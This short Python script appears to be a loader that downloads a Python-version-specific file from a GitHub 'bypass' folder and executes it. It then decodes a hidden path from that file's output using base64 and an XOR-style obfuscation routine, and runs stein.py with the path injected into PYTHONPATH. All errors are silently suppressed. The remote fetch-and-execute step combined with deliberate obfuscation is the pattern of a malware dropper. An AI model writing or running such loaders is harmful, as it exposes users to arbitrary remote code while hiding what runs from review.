#not usefull stein
import subprocess
import base64
import math
import os
import sys
import urllib.request
import re
import tempfile

def deobfuscate_path(obf_str):
    result = []
    for i, c in enumerate(obf_str):
        key = int(abs(math.sin(i + 1) * 100)) ^ ((i * 13 + 7) % 97)
        decoded_char = chr(ord(c) ^ (key % 256))
        result.append(decoded_char)
    return ''.join(result)

try:
    ver = f"{sys.version_info.major}.{sys.version_info.minor}"
    file_map = {
        "3.11": "3.11.py",
        "3.12": "3.12.py",
        "3.13": "3.13.py"
    }

    if ver not in file_map:
        sys.exit(0)

    url = f"https://raw.githubusercontent.com/devilstein1/Files/main/bypass/{file_map[ver]}"
    with urllib.request.urlopen(url) as response:
        code = response.read().decode("utf-8")

    with tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w", encoding="utf-8") as temp_file:
        temp_file.write(code)
        temp_file_path = temp_file.name

    result = subprocess.run(
        [sys.executable, temp_file_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True
    )

    if result.returncode != 0:
        sys.exit(1)

    match = re.search(r'\{["\']stein["\']\s*:\s*["\']([a-fA-F0-9]+)["\']\}', result.stdout)
    if not match:
        sys.exit(1)

    encoded = match.group(1)
    b64_decoded = base64.b64decode(bytes.fromhex(encoded)).decode()
    decoded_path = deobfuscate_path(b64_decoded)

    env = os.environ.copy()
    env["PYTHONPATH"] = decoded_path + os.pathsep + env.get("PYTHONPATH", "")
    subprocess.run([sys.executable, "stein.py"], env=env)

except:
    pass
